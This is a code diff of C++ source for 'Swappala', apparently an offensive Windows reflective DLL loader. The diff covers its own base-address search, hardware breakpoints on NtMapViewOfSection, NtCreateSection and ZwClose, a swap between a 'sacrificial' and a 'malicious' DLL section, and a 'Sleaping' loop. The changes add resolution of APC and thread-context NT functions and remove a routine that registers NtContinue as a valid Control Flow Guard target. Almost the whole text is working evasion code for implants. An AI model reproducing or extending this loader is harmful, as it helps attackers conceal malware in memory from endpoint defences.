@@ -7,10 +7,8 @@
 #include "sleaping.h"
 #include "syscalls.h"
 #include "swappala.h"
-#include "funcaliases.h"
 
 #define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)
-
 
 
 /*-------------------REFLECTIVE LOADER----------------------------*/
@@ -84,6 +82,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     CHAR zwclose[] = { 'Z','w','C','l','o','s','e','\0' };
     CHAR ntMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
     CHAR ntCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
+   
 
     //NT status variable for syscall return code
     NTSTATUS STATUS = 0x00;
@@ -112,9 +111,10 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     zwCloseAddress = GPAR(GMHR(ntdll), zwclose);
     NtMapViewOfSectionAddress = GPAR(GMHR(ntdll), ntMapViewOfSection);
     NtCreateSectionAddress = GPAR(GMHR(ntdll), ntCreateSection);
-    if (zwCloseAddress != NULL && NtMapViewOfSectionAddress != NULL && NtCreateSectionAddress != NULL)
+    if (zwCloseAddress != NULL && NtMapViewOfSectionAddress != NULL && NtCreateSectionAddress != NULL){
+        
         setHardwareBreakpoint(zwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress, zwFunctions);
-
+	}
     /*--------------BRUTE FORCE REFLECTIVE DLL BASE ADDRESS--------------*/
 
     dllBaseAddress = (ULONG_PTR)ReflectiveFunction;
@@ -194,8 +194,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {
     payloadSizeforSyscallSacDll = (SIZE_T)pImgNTHdrSacDll->OptionalHeader.SizeOfImage;
 
     /*----------------RETRIEVE THE DLL HANDLE WITH KERNEL OBJ ENUM---------------------*/
-
-    HANDLE sacDllHandle = FindSectionHandle(zwFunctions, (fnGetProcessId)GPAR(GMHR(kernel32), getProcessId));
+	HANDLE sacDllHandle = FindSectionHandle(zwFunctions, (fnGetProcessId)GPAR(GMHR(kernel32), getProcessId));
     
     
     /*------------------SWAPPALA STUFF--------------------------*/
@@ -528,56 +527,84 @@ EXTERN_DLL_EXPORT bool CrazyLoader() {
 }
 
 
-int CfgAddressAdd(IN HANDLE Process, IN PVOID ImageBase, IN PVOID Function) {
-    CFG_CALL_TARGET_INFO Cfg = { 0 };
-    MEMORY_RANGE_ENTRY   MemRange = { 0 };
-    VM_INFORMATION       VmInfo = { 0 };
-    PIMAGE_NT_HEADERS    NtHeader = { 0 };
-    ULONG                Output = 0;
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (hNtdll == NULL) {
-        return FALSE;
+bool InitializeFunctionAddress(PFUNCTION_ADDRESSES fnAddr) {
+    // handle to ntdll and user32
+    HMODULE hNtdll = { 0 };
+    HMODULE hUser32 = { 0 };
+	HMODULE hKernel32 = { 0 };
+    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
+        return false;
     }
-
-    const ULONG VmCfgCallTargetInformation = 2;
-   
-    NtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
-    MemRange.NumberOfBytes = (NtHeader->OptionalHeader.SizeOfImage + 0x1000 - 1) & ~(0x1000 - 1);
-    MemRange.VirtualAddress = ImageBase;
-
-    /* set cfg target call info */
-    Cfg.Flags = CFG_CALL_TARGET_VALID;
-    Cfg.Offset = (ULONG_PTR)Function - (ULONG_PTR)ImageBase;
-
-    VmInfo.dwNumberOfOffsets = 1;
-    VmInfo.plOutput = &Output;
-    VmInfo.ptOffsets = &Cfg;
-    VmInfo.pMustBeZero = FALSE;
-    VmInfo.pMoarZero = FALSE;
-
-    NtSetInformationVirtualMemory NtSetInfoVirtualMem = (NtSetInformationVirtualMemory)GetProcAddress(hNtdll, "NtSetInformationVirtualMemory");
-
-	if (!NtSetInfoVirtualMem) {
-		return -1;
+    if (!(hUser32 = GetModuleHandleA("user32.dll"))) {
+        return false;
+    }
+	if (!(hKernel32 = GetModuleHandleA("kernel32.dll"))) {
+		return false;
 	}
+    // function pointers for thread contexts
+    fnAddr->NtTestAlertAddress = GetProcAddress(hNtdll, "NtTestAlert");
+    fnAddr->NtWaitForSingleObjectAddress = GetProcAddress(hNtdll, "NtWaitForSingleObject");
+    fnAddr->MessageBoxAddress = GetProcAddress(hUser32, "MessageBoxA");
+    fnAddr->ResumeThreadAddress = GetProcAddress(hKernel32, "ResumeThread");
 
-    if (!NT_SUCCESS(NtSetInfoVirtualMem(Process, VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof(VmInfo)))) {
-        
-		return -1;
+    if (fnAddr->NtTestAlertAddress == NULL || fnAddr->NtWaitForSingleObjectAddress == NULL || fnAddr->MessageBoxAddress == NULL || fnAddr->ResumeThreadAddress == NULL) {
+        return false;
     }
 
-	return 0;
+
+    return true;
+}
+
+bool InitializeNtFunctions(PNT_FUNCTIONS ntFunctions)
+{
+    // Load the ntdll.dll library
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll == NULL)
+    {
+   
+        return false;
+    }
+
+    ntFunctions->NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hNtdll, "NtWaitForSingleObject");//
+    ntFunctions->NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hNtdll, "NtQueueApcThread");//
+    ntFunctions->NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hNtdll, "NtGetContextThread");//
+    ntFunctions->NtSetContextThread = (NtSetContextThreadFunc)GetProcAddress(hNtdll, "NtSetContextThread");//
+    ntFunctions->NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hNtdll, "NtCreateThreadEx"); // Added
+    ntFunctions->NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hNtdll, "NtCreateEvent");
+    ntFunctions->NtResumeThread = (NtResumeThreadFunc)GetProcAddress(hNtdll, "NtResumeThread");//
+
+    // Check if all function addresses were retrieved successfully
+    if (!ntFunctions->NtResumeThread || !ntFunctions->NtWaitForSingleObject || !ntFunctions->NtQueueApcThread ||
+        !ntFunctions->NtGetContextThread || !ntFunctions->NtSetContextThread || !ntFunctions->NtCreateThreadEx || !ntFunctions->NtCreateEvent) // Modified
+    {
+       
+        return false;
+    }
+
+    return true;
 }
 
 VOID CoreFunction(LPVOID lpParam) {
 
     PCORE_ARGUMENTS CoreArguments = NULL;
     CoreArguments = (PCORE_ARGUMENTS)lpParam;
+	
+    //here i need to initialize all the NtFunctions 
+	PNT_FUNCTIONS ntFunctions = (PNT_FUNCTIONS)VirtualAlloc(NULL, sizeof(NT_FUNCTIONS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!InitializeNtFunctions(ntFunctions))
+    {
+        return;
+    }
+    PFUNCTION_ADDRESSES fnAddr = (PFUNCTION_ADDRESSES) VirtualAlloc(NULL, sizeof(FUNCTION_ADDRESSES), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!InitializeFunctionAddress(fnAddr)) {
+        
+        return;
+    }
 
     //looping and Sleaping <3
     do {
         MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
-        if (Sleaping(CoreArguments->myBase, CoreArguments->sacDLLHandle, CoreArguments->malDLLHandle, CoreArguments->viewSize) == -1) {
+        if (Sleaping(CoreArguments->myBase, CoreArguments->sacDLLHandle, CoreArguments->malDLLHandle, CoreArguments->viewSize, ntFunctions, fnAddr) == -1) {
             //nightmares
             MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
             return;
@@ -599,6 +626,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     case DLL_PROCESS_ATTACH:
     {
        
+		
         PBYTE oldMemory = NULL;
         
         //even if unampped it's in the PEB
@@ -633,11 +661,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
             //error releasing old buffer
             return FALSE;
         }
-        //adding NtContinue to valid target as the new SleapingAPC implementation
-        if (CfgAddressAdd(GetCurrentProcess(), hNtdll, GetProcAddress(hNtdll, "NtContinue")) == -1) {
-			//error adding the address
-			return FALSE;
-        }
+        
 
         PCORE_ARGUMENTS CoreArguments = (PCORE_ARGUMENTS)VirtualAlloc(NULL, sizeof(CORE_ARGUMENTS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         CoreArguments->myBase = myBase;
